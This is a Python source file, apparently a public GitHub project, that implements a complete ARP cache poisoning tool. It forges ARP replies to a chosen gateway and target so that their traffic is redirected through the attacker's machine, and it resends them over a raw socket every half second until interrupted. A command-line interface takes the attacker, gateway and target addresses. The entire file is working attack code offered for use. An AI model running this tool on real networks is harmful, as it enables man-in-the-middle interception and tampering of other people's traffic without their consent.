#!/usr/bin/env python3
# https://github.com/EONRaider/Arp-Spoofer

__author__ = 'EONRaider @ keybase.io/eonraider'

"""
A low-level ARP Cache Poisoning (a.k.a "ARP Spoofing") tool.
"""

import abc
import argparse
import re
import time
from functools import partial
from socket import htons, inet_aton, ntohs, socket, PF_PACKET, SOCK_RAW
from struct import pack


class Protocol(abc.ABC):
    @staticmethod
    def hardware_to_hex(mac):
        return b''.join(bytes.fromhex(octet) for octet in re.split('[:-]', mac))

    @abc.abstractmethod
    def payload(self):
        pass


class EthernetFrame(Protocol):  # IEEE 802.3 standard
    def __init__(self, dest_hdwr: str, source_hdwr: str, ethertype: bytes):
        self.dest_hdwr = dest_hdwr
        self.source_hdwr = source_hdwr
        self.ethertype = ethertype
        self.__set_hdwr_addrs_as_bytes()

    def __set_hdwr_addrs_as_bytes(self):
        self.bytes_dest_hdwr, self.bytes_source_hdwr = \
            (self.hardware_to_hex(addr) for addr in
             (self.dest_hdwr, self.source_hdwr))

    @property
    def payload(self):
        return self.bytes_dest_hdwr + self.bytes_source_hdwr + self.ethertype


class ARPPacket(Protocol):  # IETF RFC 826
    def __init__(self, sender_hdwr: str, sender_proto: str,
                 target_hdwr: str, target_proto: str,
                 htype: int = 1, ptype: int = 0x0800,
                 hlen: int = 6, plen: int = 4, oper: int = 2):
        self.sender_hdwr = sender_hdwr
        self.sender_proto = sender_proto
        self.target_hdwr = target_hdwr
        self.target_proto = target_proto
        self.htype = htype
        self.ptype = ptype
        self.hlen = hlen
        self.plen = plen
        self.oper = oper
        self.__set_hdwr_addrs_as_bytes()
        self.__set_proto_addrs_as_bytes()
        self.__set_header_as_bytes()

    def __set_hdwr_addrs_as_bytes(self):
        self.bytes_sender_hdwr, self.bytes_target_hdwr = \
            (self.hardware_to_hex(addr) for addr
             in (self.sender_hdwr, self.target_hdwr))

    def __set_proto_addrs_as_bytes(self):
        self.bytes_sender_proto, self.bytes_target_proto = \
            (inet_aton(addr) for addr in (self.sender_proto, self.target_proto))

    def __set_header_as_bytes(self):
        self.bytes_htype, self.bytes_ptype, self.bytes_oper = \
            (pack('!H', field) for field in (self.htype, self.ptype, self.oper))
        self.bytes_hlen, self.bytes_plen = \
            (pack('B', field) for field in (self.hlen, self.plen))

    @property
    def payload(self):
        return self.bytes_htype + self.bytes_ptype + self.bytes_hlen \
               + self.bytes_plen + self.bytes_oper \
               + self.bytes_sender_hdwr + self.bytes_sender_proto \
               + self.bytes_target_hdwr + self.bytes_target_proto


class AttackPackets(object):
    def __init__(self, attacker_mac: str, gateway_mac: str, gateway_ip: str,
                 target_mac: str, target_ip: str):
        self.attacker_mac = attacker_mac
        self.gateway_mac = gateway_mac
        self.gateway_ip = gateway_ip
        self.target_mac = target_mac
        self.target_ip = target_ip
        self.__get_payloads()

    def __iter__(self):
        yield from (self.payload_to_gateway, self.payload_to_target)

    def __get_payloads(self):
        self.__build_eth_frames()
        self.__build_arp_packets()
        self.payload_to_gateway = self.eth_frame_to_gateway.payload \
                                  + self.arp_pkt_to_gateway.payload
        self.payload_to_target = self.eth_frame_to_target.payload \
                                 + self.arp_pkt_to_target.payload

    def __build_eth_frames(self):
        eth_frame = partial(EthernetFrame, source_hdwr=self.attacker_mac,
                            ethertype=b'\x08\x06')
        self.eth_frame_to_gateway = eth_frame(dest_hdwr=self.gateway_mac)
        self.eth_frame_to_target = eth_frame(dest_hdwr=self.target_mac)

    def __build_arp_packets(self):
        self.arp_pkt_to_gateway = ARPPacket(self.attacker_mac, self.target_ip,
                                            self.gateway_mac, self.gateway_ip)
        self.arp_pkt_to_target = ARPPacket(self.attacker_mac, self.gateway_ip,
                                           self.target_mac, self.target_ip)


class Spoofer(object):
    def __init__(self, interface: str):
        self.interface = interface

    def execute(self, spoofed_packets):
        with socket(PF_PACKET, SOCK_RAW, ntohs(0x0800)) as sock:
            sock.bind((self.interface, htons(0x0800)))
            while True:
                for packet in spoofed_packets:
                    sock.send(packet)
                time.sleep(0.5)


def spoof(args):
    """Controls the flow of execution of the ARP Spoofer tool."""
    packets = AttackPackets(attacker_mac=args.attackermac,
                            gateway_mac=args.gatemac, gateway_ip=args.gateip,
                            target_mac=args.targetmac, target_ip=args.targetip)
    spoofer = Spoofer(interface=args.interface)
    print('[+] ARP Spoofing attack initiated. Press Ctrl-C to abort.')
    try:
        spoofer.execute(packets)
    except KeyboardInterrupt:
        raise SystemExit('[!] ARP Spoofing attack terminated.')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Execute ARP Cache Poisoning attacks (a.k.a "ARP '
                    'Spoofing") on local networks.')
    parser.add_argument('interface', type=str,
                        help='Interface on the attacker machine to '
                             'send/receive packets from.')
    parser.add_argument('--attackermac', type=str, required=True, metavar='MAC',
                        help='MAC address of the Network Interface Controller '
                             '(NIC) used by the attacker.')
    parser.add_argument('--gatemac', type=str, required=True, metavar='MAC',
                        help='MAC address of the NIC associated to the '
                             'gateway.')
    parser.add_argument('--targetmac', type=str, required=True, metavar='MAC',
                        help='MAC address of the NIC associated to the target.')
    parser.add_argument('--gateip', type=str, required=True, metavar='IP',
                        help='IP address currently assigned to the gateway.')
    parser.add_argument('--targetip', type=str, required=True, metavar='IP',
                        help='IP address currently assigned to the target.')
    spoof(parser.parse_args())
